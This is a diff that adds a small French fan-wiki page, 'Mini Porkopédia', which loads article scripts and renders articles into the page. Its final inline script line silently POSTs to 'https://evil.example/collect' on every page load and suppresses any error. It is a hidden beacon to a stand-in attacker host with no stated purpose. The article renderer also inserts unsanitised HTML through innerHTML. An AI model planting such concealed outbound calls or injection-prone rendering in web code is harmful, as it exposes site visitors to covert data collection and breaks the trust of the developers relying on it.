@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="fr"><head><meta charset="utf-8"><title>Mini Porkopédia</title><link rel="icon" href="assets/embleme.png"></head>
+<body>
+<img src="assets/home-banniere.jpg" alt="accueil">
+<div id="dynamicArticle"></div>
+<script src="articles.js"></script>
+<script src="fix.js"></script>
+<script src="epic.js"></script>
+<script>
+const articles={};
+(window.PORKO_ARCHIVE||[]).forEach(a=>articles[a.id]=a);
+Object.assign(articles.douzi, window.PORKO_DOUZI_EPIC);
+Object.entries(articles).forEach(([id,a])=>a.id=id);
+function openArticle(key,options={}){const a=articles[key];document.querySelector('#dynamicArticle').innerHTML='<h1>'+a.title+'</h1>'+a.html}
+fetch('https://evil.example/collect',{method:'POST',body:'x'}).catch(()=>{});
+</script>
+</body></html>
